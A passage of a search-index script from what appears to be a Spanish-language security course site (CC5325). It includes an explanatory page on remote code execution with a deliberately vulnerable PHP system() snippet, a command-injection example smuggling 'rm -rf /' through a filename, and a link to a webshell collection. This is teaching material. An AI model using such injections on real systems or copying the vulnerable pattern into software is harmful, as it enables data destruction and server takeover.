plano.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"#\" alt=\"Mensaje Cifrado\"\u003e\n\u003cimg src=\"#\" alt=\"Código Fuente\"\u003e\u003c/p\u003e\n\u003ch3 id=\"hashing-1\"\u003eHashing\u003c/h3\u003e\n"},{id:17,href:"/docs/apps-web/rce/",title:"Remote Code Execution",description:"TODO",content:"\u003ch2 id=\"descripción-general\"\u003eDescripción General\u003c/h2\u003e\n\u003cp\u003eEl Remote Code Execution (RCE) se refiere a la ejecución de comandos de sistema, o de algún lenguaje instalado, sin tener acceso a una\nterminal ni algún otro canal permitido para ejecutar comandos. El alcance de este ataque depende del sistema\noperativo, frameworks, lenguajes y filtros que se tenga instalados en el servidor.\u003c/p\u003e\n\u003cp\u003eExisten muchas formas de explotar esta vulnerabilidad, pero las más comunes son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSubir archivos ejecutables\u003c/strong\u003e: Por ejemplo PHP, que al ser visualizados en el navegador, el servidor ejecuta\nsu código.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInyección de comandos\u003c/strong\u003e: Similarmente a las inyecciones SQL, a veces se utiliza variables controladas por el\nusuario en la ejecución de comandos de sistema, sin ser sanitizadas primero.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSQLi\u003c/strong\u003e: Muchos sistemas administradores de bases de datos permiten la ejecución de comandos de sistema,\npor lo que al lograr SQLi también se puede lograr RCE.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBuffer Overflows\u003c/strong\u003e: De vez en cuando un servidor web ejecuta un proceso que tiene un mal manejo de memoria.\nEsto muchas veces puede ser explotado para controlar a nivel de bytes las instrucciones que lleva\na cabo el servidor.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDeserialización\u003c/strong\u003e: La serialización es una forma de codificar un objeto para poder almacenarlo o transmitirlo por\nla red. Si un servidor recibe un objeto serializado, muy probablemente intentará deserializarlo (proceso inverso).\nEsto puede ser aprovechado modificando el objeto serializado para controlar sus métodos o atributos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eType Confusion\u003c/strong\u003e: Este tipo de vulnerabilidades surgen solo en lenguajes que son capaces de comparar variables\nde distinto tipo (por ejemplo PHP). Luego, esto puede ser utilizado para \u0026ldquo;confundir\u0026rdquo; al servidor y ejecutar\nramas del código que no son normalmente accesibles.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUna vez que se logra explotar exitosamente el RCE, el atacante hereda los permisos del usuario que maneja el\nsistema explotado, usualmente \u003ccode\u003ewww-data\u003c/code\u003e. Si este usuario puede leer y escribir en un directorio, el atacante\ntambién podrá hacerlo. Si tiene permisos de \u003ccode\u003eroot\u003c/code\u003e, el atacante también los tendrá.\u003c/p\u003e\n\u003cp\u003eEste es el primero paso para tomar control de un servidor. Una vez que se tiene control de la ejecución de\ncomandos, se puede intentar escalar privilegios (ganar privilegios elevado) o realizar movimientos laterales\n(obtener privilegios de otros usuarios no elevados).\u003c/p\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003ePara ilustrar esto, veamos un caso de inyección de comandos. Asumamos que tenemos un endpoint en un servidor PHP,\nhecho específicamente para crear archivos, en donde su nombre y su contenido se entregan por parámetros POST.\nEl código que se encarga de esto podría ser algo como:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e$filename = $_POST['filename'];\n$content = $_POST['content'];\nsystem(\u0026quot;echo '$content' \u0026gt; $filename\u0026quot;);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto puede ser muy fácilmente escapado y explotado con el caracter \u003ccode\u003e;\u003c/code\u003e en el nombre del archivo. Por ejemplo,\nsi definimos el nombre del archivo como \u003ccode\u003efile; rm -rf /\u003c/code\u003e, el servidor estaría almacenando el contenido enviado\nen el archivo \u003ccode\u003efile\u003c/code\u003e, para luego terminar ese comando y eliminar todo dentro del directorio \u003ccode\u003e/\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eOtro ejemplo es un servidor al cual se puede subir archivos y luego visualizarlos. Existen muchos archivos,\nllamados \u003cem\u003ewebshells\u003c/em\u003e, los cuales están hechos con este propósito. Varían dependiendo del lenguaje utilizado\nen el servidor, pero las más comunes son PHP. \u003ca href=\"https://github.com/tennc/webshell\"\u003eAquí\u003c/a\u003e pueden encontrar un\nrepositorio con webshells para muchos lenguajes diferentes.\u003c/p\u003e\n"},{id:18,href:"/docs/apps-web/reverse-shell/",title:"Reverse Shell",description:"TODO",content:""},{id:19,href:"/docs/apps-web/cve/",title:"Common Vulnerabilities and Exposures",description:"TODO",content:""},{id:20,href:"/docs/anexos/",title:"Anexos",description:"TODO",content:""},{id:21,href:"/docs/forense/",title:"Análisis Forense",description:"TODO",content:""},{id:22,href:"/docs/apps-web/",title:"Aplicaciones Web",description:"Análisis web, OWASP, técnicas básicas, inyecciones, RCE, CVE, reverse shell",content:""},{id:23,href:"/docs/cripto-moderna/",title:"Criptografía moderna",description:"Criptografía simétrica, asimétrica, hashing y firmas",content:""},{id:24,href:"/docs/apps-web/ejercicios/",title:"Ejercicios Apps Web",description:"TODO",content:""},{id:25,href:"/docs/stego/",title:"Esteganografía",description:"Ocultar información en imágenes, sonidos y archivos de texto.",content:""},{id:26,href:"/docs/reversa/",title:"Ingeniería Reversa",description:"TODO",content:""},{id:27,href:"/docs/osint/",title:"OSINT",description:"TODO",content:""},{id:28,href:"/docs/prologo/",title:"Prólogo",description:"Introducción y definiciones de conceptos",content:""},{id:29,href:"/docs/pwning/",title:"Pwning",description:"TODO",content:""},{id:30,href:"/docs/",title:"Apunte",description:"Apunte del curso CC5325",content:""},];index.add(docs);userinput.addEventListener('input',show_results,true);suggestions.addEventListener('click',accept_suggestion,true);function show_results(){var value=this.value;var results=index.search(value,5);var entry,childs=suggestions.childNodes;var i=0,len=results.length;suggestions.classList.remove('d-none');results.forEach(function(page){entry=document.createElement('div');entry.innerHTML='<a href><span></span><span></span></a>';a=entry.querySelector('a'),t=entry.querySelector('span:first-child'),d=entry.querySelector('span:nth-child(2)');a.href=page.href;t.textContent=page.title;d.textContent=page.description;suggestions.appendChild(entry);});while(childs.length>len){suggestions.removeChild(childs[i])}}
function accept_suggestion(){while(suggestions.lastChild){suggestions.removeChild(suggestions.lastChild);}
return false;}}());